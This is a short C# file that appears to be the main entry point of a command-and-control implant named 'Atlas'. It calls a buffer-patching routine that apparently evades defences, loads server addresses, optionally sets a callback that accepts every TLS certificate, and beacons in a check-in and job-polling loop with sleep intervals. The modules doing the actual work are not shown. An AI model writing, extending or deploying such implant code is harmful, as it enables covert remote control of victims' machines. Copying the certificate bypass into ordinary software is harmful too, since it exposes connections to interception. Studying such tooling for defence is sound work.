using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Atlas
{
    class Program
    {
        public static void Main(string[] args)
        {
            Modules.PatchBuffer();
            Utils.GetServers();
#if CERT_FALSE
            System.Net.ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
#endif
            while (!Http.CheckIn())
            {
                int Dwell = Utils.GetDwellTime();
                System.Threading.Thread.Sleep(Dwell);
            }
            Utils.JobList JobList = new Utils.JobList
            {
                job_count = 0,
                jobs = { }
            };
            while (true)
            {
                Utils.Loop(JobList);
                int Dwell = Utils.GetDwellTime();
                System.Threading.Thread.Sleep(Dwell);
            }
        }
    }
}
